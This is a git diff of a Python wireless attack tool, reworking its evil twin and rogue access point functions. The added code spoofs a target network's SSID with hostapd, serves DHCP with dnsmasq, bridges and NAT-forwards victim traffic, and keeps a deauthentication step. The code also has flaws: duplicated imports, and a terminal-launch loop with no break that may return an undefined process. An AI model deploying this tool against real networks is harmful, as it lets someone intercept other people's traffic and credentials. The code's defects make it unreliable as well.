@@ -1,5 +1,13 @@
 import os
 import time
+import os
+import signal
+import subprocess
+import time
+import re
+import keyboard
+import glob
+import subprocess
 
 import Network
 import main
@@ -9,6 +17,7 @@ import threading
 import subprocess
 
 terminals = ['x-terminal-emulator', 'gnome-terminal', 'konsole', 'xfce4-terminal']
+
 
 def run_command(command):
     """
@@ -21,14 +30,13 @@ def run_command(command):
     result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
     print(f"Command: {command}")
     if result.returncode == 0:
-        print("Output:\n" + result.stdout)
-        print('\n')
+        print(f"{ansi_escape_green('Output')}   :   " + result.stdout)
+        print("-" * 30)
         return result.stdout
     else:
-        print(f"{ansi_escape_red('Error')}:\n" + result.stderr)
-        print('\n')
+        print(f"{ansi_escape_red('Error')}      :   " + result.stderr)
+        print("-" * 30)
         return result.stderr
-    print("-" * 30)
 
 
 def popen_command(command):
@@ -40,34 +48,47 @@ def popen_command(command):
     return process
 
 
+
 def popen_command_new_terminal(command):
     """
     This function is used for commands that require simultaneous execution (designed for the evil twin attack). With
     this update, child terminals are not bound to the parent terminal, allowing us to see the stderr and stdout. If
     we were to use the old logic of creating child terminals, an error would cause the child terminal to close
     immediately, causing us to lose any output that could be useful for troubleshooting.
+
+    Returns the PID of the subprocess if successful, otherwise returns None.
     """
-    command_success = False
+    terminals = ['gnome-terminal', 'konsole', 'xfce4-terminal', 'x-terminal-emulator']  # Example terminal list
     for terminal in terminals:
         try:
             # Append 'exec bash' to keep the terminal open
             terminal_command = ""
             if terminal == 'gnome-terminal':
-                terminal_command = f"{terminal} -- /bin/sh -c '{command}; exec bash'"
+                terminal_command = f"{terminal} -e /bin/sh -c '{command}; exec bash'"
             elif terminal == 'konsole':
                 terminal_command = f"{terminal} -e /bin/sh -c '{command}; exec bash'"
             elif terminal == 'xfce4-terminal':
                 terminal_command = f"{terminal} -e 'bash -c \"{command}; exec bash\"'"
             else:
                 terminal_command = f"{terminal} -e 'bash -c \"{command}; exec bash\"'"
-            print(f"Executing command: {ansi_escape_green(terminal_command)}\n")
-            subprocess.Popen(terminal_command, shell=True)
-            command_success = True
-            break
+            print(f"Executing command: {terminal_command}\n")
+
+            # Start the subprocess and get its PID
+            process = subprocess.Popen(terminal_command, shell=True, preexec_fn=os.setsid)
+
         except Exception as e:
-            print(f"Failed to execute command in {ansi_escape_green(terminal)}: {ansi_escape_red(e)} \n")
-    if not command_success:
-        print("Failed to execute command in a new terminal. No compatible terminal emulator found.\n")
+            print(f"Failed to execute command in {terminal}: {e} \n")
+
+    return process
+
+
+def kill_process(process):
+    if process:
+        try:
+            os.killpg(process.pid, signal.SIGTERM)
+            print(f"Process ({ansi_escape_green(process)}) was terminated.")
+        except Exception as e:
+            return
 
 
 def switch_interface_channel(interface, target_channel):
@@ -91,27 +112,73 @@ def aireplay_on_target_bssid(interface, channel, target_ap=None, target_bssid=No
     return
 
 
-def airbase_host_evil_twin(interface, channel, target_ap=None, target_bssid=None):
-    if target_bssid and not target_ap:
-        print('Functionality for BSSID without AP not implemented yet.')
-        return
-    else:
-        command = f'airbase-ng -e {target_ap} -c {channel} {interface}'
-        command = f'airbase-ng -e {target_ap} {interface}'
-
-        message_to_user = f'Running airbase-ng to host {ansi_escape_green(target_ap)} on a new interface'
-    popen_command_new_terminal(command)
-    print(message_to_user)
-    return
+# def airbase_host_evil_twin(interface, channel, target_ap=None, target_bssid=None):
+#     if target_bssid and not target_ap:
+#         print('Functionality for BSSID without AP not implemented yet.')
+#         return
+#     else:
+#         command = f'airbase-ng -e {target_ap} -c {channel} {interface}'
+#         message_to_user = f'Running airbase-ng to host {ansi_escape_green(target_ap)} on a new interface'
+#     popen_command_new_terminal(command)
+#     print(message_to_user)
+#     return
 
 
-def create_dnsmasq_conf():
+def hostapd(interface, internet_facing_interface, target_ap=None, channel=None, bridge=None):
     """
 
-    :return: dnsmasq_conf_location : location of dnsmasq.conf file to be used in dnsmasq()
+    :param interface:
+    :param internet_facing_interface:
+    :param target_ap:
+    :param channel:
+    :param bridge:
+    :return: returns the bridge name to be used dnsmasq in clearing process. this bridge will be removed after evil_twin or rogue_ap
+    """
+    print(f'Creating {ansi_escape_green("hostapd")} config file')
+    if not bridge:
+        bridge = input(f'Select a name for bridge {ansi_escape_green("(default = roguebr)")} : ')
+        if bridge == "":
+            bridge = 'roguebr'
+    clear()
+    print(f'Creating/Configuring Bridge : {ansi_escape_green(bridge)}\n')
+    run_command(f'brctl addbr {bridge}')
+    run_command(f'brctl addif {bridge} {internet_facing_interface}')
+    bring_interface_up(bridge)
+    bring_interface_up(internet_facing_interface)
+
+    if not target_ap:
+        target_ap = input(f'Select a name for the Network {ansi_escape_green("(default = rogue)")} : ')
+        if target_ap == "":
+            target_ap = 'rogue'
+            channel = '1'
+
+    hostapd_conf_location = '/tmp/hostapd.conf'
+    conf_file = [
+        f'interface={interface}',
+        f'driver=nl80211',
+        f'bridge={bridge}',
+        f'hw_mode=g',
+        f'ssid={target_ap}',
+        f'channel={channel}'
+    ]
+    with open(hostapd_conf_location, 'w') as hostapd_conf:
+        for line in conf_file:
+            hostapd_conf.write(line + "\n")
+    print('hostapd.conf created at /tmp/hostapd.conf')
+    print(f'Running {ansi_escape_green("hostapd")}')
+    hostapd_process = popen_command_new_terminal(f'hostapd {hostapd_conf_location}')
+    return bridge, hostapd_process
+
+
+def dnsmasq(bridge):
+    """
+    with bridge information from
+
+    :param bridge:
+    :return:
     """
     dnsmasq_conf_location = '/tmp/dnsmasq.conf'
-    conf_file = ["interface=at0",
+    conf_file = [f"interface={bridge}",
                  "dhcp-range=192.168.2.1,192.168.2.255,255.255.255.0,12h",
                  "dhcp-option=3,192.168.2.1",
                  "dhcp-option=6,192.168.2.1",
@@ -127,61 +194,22 @@ def create_dnsmasq_conf():
         for line in conf_file:
             dnsmasq_conf.write(line + "\n")
     print('dnsmasq.conf created at /tmp/dnsmasq.conf')
-    return dnsmasq_conf_location
-
-
-def dnsmasq():
-    dnsmasq_conf_location = create_dnsmasq_conf()
     print(f'Running dnsmasq with the config file on {ansi_escape_green(dnsmasq_conf_location)}')
     command = f'dnsmasq -C {dnsmasq_conf_location} -d'
+    # restart to update dnsmasq with new configuration
+    run_command('systemctl restart dnsmasq')
     popen_command_new_terminal(command)
 
 
-def configure_at0(interface):
-    # Bring up the at0 interface
-    run_command('ifconfig at0 up')
+def requirements():
+    run_command('apt-get install dnsmasq -y')
+    run_command('apt-get install hostapd -y')
+    run_command('apt-get install apache2 -y')
 
-    # Clear existing iptables rules to start fresh (consider more selective flushing for production environments)
-    run_command('iptables --flush')
-    run_command('iptables -t nat --flush')
-    run_command('iptables -t mangle --flush')
-    run_command('iptables -P FORWARD ACCEPT')
-
-    # Set the MTU for at0 (optional, based on your needs)
-    run_command('ifconfig at0 mtu 1500')
-
-    # Configure the at0 interface with a new IP and subnet mask
-    run_command('ifconfig at0 192.168.2.1 netmask 255.255.255.0')
-
-    # Configure routing for the new subnet. This might not be necessary depending on your setup,
-    # as NAT and IP forwarding are the critical parts for internet access.
-    # run_command('route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1')
-
-    # Enable NAT to allow devices connected to at0 to access the internet through your internet-facing interface
-    run_command(f'iptables --table nat --append POSTROUTING --out-interface {interface} -j MASQUERADE')
-
-    # Allow forwarding from at0 to the internet-facing interface
-    run_command('iptables --append FORWARD --in-interface at0 -j ACCEPT')
-
-    # Enable IP forwarding to allow the Linux kernel to forward packets between interfaces
-    run_command('echo 1 > /proc/sys/net/ipv4/ip_forward')
-
-
-def evil_twin(interface, target_ap):
-    bssid, channel = Network.get_BSSID_and_Station_from_AP(interface, target_ap)
-    # print(f'Changing {ansi_escape_green(interface)} to managed mode')
-    # main.switch_selected_interface_to_managed_mode()
-    aireplay_on_target_bssid(interface, channel, target_ap=target_ap, target_bssid=bssid)
-    airbase_host_evil_twin(interface, channel, target_ap=target_ap, target_bssid=bssid)
-    time.sleep(1.5)
-    configure_at0(interface)
-    dnsmasq()
-
-    input('press enter to close the evil twin | cleanup network rules')
-    evil_twin_cleanup(interface)
-    # remove masquared rules for wlan0
-def arp_spoof(interface):
-    return
+def stop_network_manager():
+    run_command('systemctl stop NetworkManager') # for kali
+def restart_network_manager():
+    run_command('systemctl restart NetworkManager') # for kali
 
 def bring_interface_up(interface):
     stdout = run_command(f'ip link show {interface}')
@@ -189,74 +217,87 @@ def bring_interface_up(interface):
         stdout2 = run_command(f'ifconfig {interface} up')
         if stdout2:
             if 'Device or resource busy' in stdout2:
-                # print('honestly just unplug')
                 process = popen_command('sudo systemctl stop NetworkManager')
                 process.wait()
                 run_command(f'ifconfig {interface} up')
-                run_command('sudo systemctl start NetworkManager')
+def bring_interface_down(interface):
+    stdout = run_command(f'ip link show {interface}')
+    if 'up' in stdout:
+        run_command(f'ifconfig {interface} down')
 
-def evil_twin_cleanup(interface):
-    def remove_masquerade_rules(interface):
-        command = ['iptables', '-t', 'nat', '-D', 'POSTROUTING', '-o', interface, '-j', 'MASQUERADE']
-        while True:
-            try:
-                subprocess.check_call(command)
-                print(f"Removed a MASQUERADE rule for {interface}")
-            except subprocess.CalledProcessError as e:
-                print(f"No more MASQUERADE rules for {interface} to remove.")
-                break
 
-    remove_masquerade_rules(interface)
+def rogue_ap(interface, internet_facing_interface, target_ap, called_from_evil_twin=False,bssid=None,channel=None):
+    def rogue_ap_cleanup(bridge, hostapd_process):
+        # cleanup dnsmasq
+        run_command(f'ip link delete {bridge} type bridge')
+        kill_process(hostapd_process)
+        restart_network_manager()
+        run_command('killall hostapd')
 
-"""
-    troubleshoot 
-    
-    --------------------------------------------------------------------------------------
-    
-        Devices connect to evil twin but no network is avaliable on the target system
-        
-        ====================    Check IP Forwarding     
-        
-        run to check ip forwarding                   $   :  sysctl net.ipv4.ip_forward      
-        output should be                             out :  net.ipv4.ip_forward = 1
-        if not, run                                  $   :   sudo sysctl -w net.ipv4.ip_forward=1
+    bssid, channel = Network.get_BSSID_and_Station_from_AP(interface, target_ap)
 
-        ====================   Verify iptables Configuration
-        script sets up NAT using iptables to masquerade traffic from the at0 interface to the 
-        internet facing interface wlan0, eth0, etc. Ensure that iptables rules are applied. 
-        You can list the iptables NAT table rules with:
-    
-        run                       $    :   sudo iptables -t nat -L -v
-        output must be like       out  {
-    
+    # NOT SURE IF THESE 3 BELOW ARE NECESSARY OR NOT
+    stop_network_manager()
+    bring_interface_down(interface)
+    bring_interface_down(internet_facing_interface)
 
-    
-    --------------------------------------------------------------------------------------
+    bridge, hostapd_process = hostapd(interface, internet_facing_interface, target_ap=target_ap, channel=channel)
+    if called_from_evil_twin:
+        return bssid, channel, bridge, hostapd_process  # to be used in aireplay-ng in evil twin, and for cleanup process
+    else:
+        input(
+            f'Press enter on this terminal to {ansi_escape_red("CLOSE")} the {ansi_escape_green("ROGUE AP")} and start cleanup process')
+        return rogue_ap_cleanup(bridge, hostapd_process)
 
-        if you see this output  :   {
-                                                Scan was not succesful due to wlan0 being DOWN
-                                                AIRODUMP-NG STDOUT ::
-                                                Failed initializing wireless card(s): wlan0
-                                        
-                                                Rerun the Scan  Y/N 
-                                     }
-                                                    
-        then your interface is down either 
-        
-        run                                       $   :  sudo ifconfig <interface> up
-        if you see this error after ifconfig      out :  SIOCSIFFLAGS: Device or resource busy
-        do                                            :  reconnect the interface
-    
-        
-    --------------------------------------------------------------------------------------
-    
-    dnsmasq:
-        1. : dnsmasq: failed to bind DHCP server socket: Address already in use
 
-            run                                        $ :   sudo lsof -i :67
-            or run                                     $ :   sudo netstat -lpn | grep :67
-            then kill the service running on port 67   $ :   sudo kill -9 <PID>
+def evil_twin(interface, internet_facing_interface, target_ap):
+    def evil_twin_cleanup(interface, internet_facing_interface, bridge, hostapd_process):
+        def cleanup_dnsmasq_masquerade(interface):
+            command = ['iptables', '-t', 'nat', '-D', 'POSTROUTING', '-o', interface, '-j', 'MASQUERADE']
+            while True:
+                try:
+                    subprocess.check_call(command)
+                    print(f"Removed a MASQUERADE rule for {interface}")
+                except subprocess.CalledProcessError as e:
+                    print(f"No more MASQUERADE rules for {interface} to remove.")
+                    break
+        # cleanup dnsmasq
+        cleanup_dnsmasq_masquerade(interface)
+        cleanup_dnsmasq_masquerade(internet_facing_interface)
+        # remove bridge
+        run_command(f'ip link delete {bridge} type bridge')
+        # kill hostapd_process
+        kill_process(hostapd_process)
+        # bring network manager up
+        restart_network_manager()
+        # bring interface up
+        bring_interface_up(interface)
+        # kill hostapd
+        run_command('killall hostapd')
+        # this command 'killall hostapd' will solve this error on hostapd
 
-                            
+        # nl80211: Could not configure driver mode
+        # nl80211: deinit ifname=wlan0 disabled_11b_rates=0
+        # nl80211 driver initialization failed.
+        # wlan0: interface state UNINITIALIZED->DISABLED
+        # wlan0: AP-DISABLED
+        # wlan0: CTRL-EVENT-TERMINATING
+        # hostapd_free_hapd_data: Interface wlan0 wasn't started
 
-"""
+        # disable ip forwarding
+        run_command('echo 0 > /proc/sys/net/ipv4/ip_forward')
+
+    # enable ip forwarding
+    run_command('echo 1 > /proc/sys/net/ipv4/ip_forward')
+    bssid, channel, bridge, hostapd_process = rogue_ap(interface, internet_facing_interface, target_ap,
+                                                       called_from_evil_twin=True)
+    # aireplay_on_target_bssid(interface, channel, target_ap=target_ap, target_bssid=bssid)
+    input(f'press enter to close the evil twin | cleanup network rules {ansi_escape_red("!! WAIT UNTIL CLEANUP ENDS")}')
+    evil_twin_cleanup(interface, internet_facing_interface, bridge, hostapd_process)
+
+
+# def arp_spoof(interface):
+#     return
+
+
+
